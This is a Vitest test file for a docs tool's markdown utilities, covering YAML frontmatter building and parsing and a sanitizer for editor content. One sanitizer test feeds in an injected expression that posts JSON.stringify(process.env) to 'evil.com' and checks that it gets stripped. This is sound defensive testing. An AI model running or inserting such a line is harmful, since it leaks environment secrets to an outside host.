/**
 * Tests for markdown serialization utilities:
 * 1. Frontmatter generation (buildFrontmatter, buildDocument, parseFrontmatter)
 * 2. Sanitizer interaction with typical editor markdown output
 *    (headings, code blocks, component tags, mixed content)
 */
import { describe, it, expect } from "vitest";
import { buildFrontmatter, buildDocument, parseFrontmatter } from "./frontmatter.js";
import { sanitizeEditorContent } from "./sanitize.js";

// ── Frontmatter generation ──────────────────────────────

describe("buildFrontmatter", () => {
  it("produces a valid YAML frontmatter block", () => {
    const result = buildFrontmatter({ title: "Getting Started" });
    expect(result).toMatch(/^---\n/);
    expect(result).toMatch(/\n---$/);
    expect(result).toContain("title: Getting Started");
  });

  it("includes description when provided", () => {
    const result = buildFrontmatter({
      title: "API Reference",
      description: "Full API documentation",
    });
    expect(result).toContain("title: API Reference");
    expect(result).toContain("description: Full API documentation");
  });

  it("omits empty or null fields", () => {
    const result = buildFrontmatter({
      title: "Page",
      description: "",
    });
    expect(result).not.toContain("description");
  });

  it("omits undefined fields", () => {
    const result = buildFrontmatter({
      title: "Page",
      description: undefined,
    });
    expect(result).not.toContain("description");
  });

  it("quotes strings containing colons", () => {
    const result = buildFrontmatter({
      title: "Guide: Advanced Usage",
    });
    expect(result).toContain('"Guide: Advanced Usage"');
  });

  it("quotes strings containing hash signs", () => {
    const result = buildFrontmatter({
      title: "C# Programming",
    });
    expect(result).toContain('"C# Programming"');
  });

  it("handles boolean values", () => {
    const result = buildFrontmatter({
      title: "Draft",
      draft: true,
    } as any);
    expect(result).toContain("draft: true");
  });

  it("handles numeric values", () => {
    const result = buildFrontmatter({
      title: "Page",
      order: 3,
    } as any);
    expect(result).toContain("order: 3");
  });

  it("handles array values", () => {
    const result = buildFrontmatter({
      title: "Tagging",
      tags: ["guide", "tutorial"],
    } as any);
    expect(result).toContain("tags:");
    expect(result).toContain("  - guide");
    expect(result).toContain("  - tutorial");
  });

  it("escapes double quotes in quoted values", () => {
    // Quotes alone don't trigger YAML quoting; colons + quotes do
    const result = buildFrontmatter({
      title: 'Using "quotes": here',
    });
    expect(result).toContain('\\"quotes\\"');
  });

  it("escapes backslashes before double quotes", () => {
    const result = buildFrontmatter({
      title: 'Path: C:\\Users\\docs',
    });
    // Backslashes must be escaped first, then quotes
    expect(result).toContain('C:\\\\Users\\\\docs');
  });

  it("handles strings with both backslashes and quotes", () => {
    const result = buildFrontmatter({
      title: 'Say \\"hello\\": world',
    });
    expect(result).toContain('\\\\');
    expect(result).toContain('\\"');
  });
});

describe("buildDocument", () => {
  it("combines frontmatter and body with blank line separator", () => {
    const doc = buildDocument({ title: "Hello" }, "# Hello\n\nContent here.");
    expect(doc).toMatch(/^---\ntitle: Hello\n---\n\n# Hello\n\nContent here\.$/);
  });

  it("preserves multiline body content", () => {
    const body = "## Section 1\n\nParagraph.\n\n## Section 2\n\nMore text.";
    const doc = buildDocument({ title: "Multi" }, body);
    expect(doc).toContain(body);
  });
});

describe("parseFrontmatter", () => {
  it("parses title and description", () => {
    const doc = "---\ntitle: Test Page\ndescription: A test\n---\n\n# Content";
    const { fields, body } = parseFrontmatter(doc);
    expect(fields.title).toBe("Test Page");
    expect(fields.description).toBe("A test");
    expect(body).toBe("# Content");
  });

  it("handles quoted values with colons", () => {
    const doc = '---\ntitle: "Guide: Setup"\n---\n\nBody';
    const { fields } = parseFrontmatter(doc);
    expect(fields.title).toBe("Guide: Setup");
  });

  it("returns raw content when no frontmatter present", () => {
    const doc = "# Just Markdown\n\nNo frontmatter.";
    const { fields, body } = parseFrontmatter(doc);
    expect(Object.keys(fields)).toHaveLength(0);
    expect(body).toBe(doc);
  });

  it("round-trips with buildDocument", () => {
    const original = buildDocument(
      { title: "Round Trip", description: "Testing" },
      "Body text.",
    );
    const { fields, body } = parseFrontmatter(original);
    expect(fields.title).toBe("Round Trip");
    expect(fields.description).toBe("Testing");
    expect(body).toBe("Body text.");
  });

  it("round-trips backslashes in quoted values", () => {
    const original = buildDocument(
      { title: 'Path: C:\\Users\\docs' },
      "Content.",
    );
    const { fields } = parseFrontmatter(original);
    expect(fields.title).toBe('Path: C:\\Users\\docs');
  });

  it("unescapes backslashes and quotes in parsed values", () => {
    const doc = '---\ntitle: "He said \\\\\\"hi\\\\\\""\n---\n\nBody';
    const { fields } = parseFrontmatter(doc);
    expect(fields.title).toContain('"');
    expect(fields.title).toContain('\\');
  });
});

// ── Sanitizer with typical editor output ────────────────

describe("sanitizer with editor-like markdown", () => {
  it("markdown with headings survives sanitization", () => {
    const md = "# Title\n\n## Subtitle\n\n### Section\n\nParagraph text.";
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("markdown with code blocks survives sanitization", () => {
    const md = [
      "Some text before.",
      "",
      "```typescript",
      'const x = { key: "value" };',
      "export function run() { return x; }",
      "```",
      "",
      "Text after.",
    ].join("\n");
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("markdown with component tags survives sanitization", () => {
    const md = [
      '<Callout type="info">',
      "Important information here.",
      "</Callout>",
      "",
      "<Steps>",
      "Step one content.",
      "</Steps>",
      "",
      '<Accordion title="FAQ">',
      "Answer here.",
      "</Accordion>",
    ].join("\n");
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("sanitizer strips JSX array expressions in component props", () => {
    // The sanitizer intentionally strips complex JSX expressions like {["a","b"]}
    // because they could be attack vectors. Only simple literals are preserved.
    const md = '<Tabs items={["npm", "yarn"]}>';
    const result = sanitizeEditorContent(md);
    expect(result).not.toContain('["npm"');
  });

  it("markdown with mixed content round-trips cleanly", () => {
    const md = [
      "# Getting Started",
      "",
      "Welcome to the docs.",
      "",
      '<Callout type="warning">',
      "Be careful with this step.",
      "</Callout>",
      "",
      "```bash",
      "npm install @tomehq/cli",
      "```",
      "",
      "## Next Steps",
      "",
      "Continue to the [next page](/docs/next).",
    ].join("\n");
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("strips dangerous expressions from editor-like content", () => {
    const md = [
      "# Safe Page",
      "",
      '<Accordion title="Details">',
      "Some content.",
      "</Accordion>",
      "",
      "{(() => { fetch('evil.com', { body: JSON.stringify(process.env) }) })()}",
      "",
      "Footer text.",
    ].join("\n");

    const result = sanitizeEditorContent(md);
    expect(result).toContain("# Safe Page");
    expect(result).toContain("<Accordion");
    expect(result).toContain("Footer text.");
    expect(result).not.toContain("fetch");
    expect(result).not.toContain("process.env");
  });

  it("full document with frontmatter and body sanitizes cleanly", () => {
    const doc = buildDocument(
      { title: "Safe Page", description: "A doc page" },
      "# Introduction\n\nSafe content here.\n\n```js\nconst x = 1;\n```",
    );
    // The frontmatter block uses --- delimiters, should pass through sanitizer
    expect(sanitizeEditorContent(doc)).toBe(doc);
  });
});
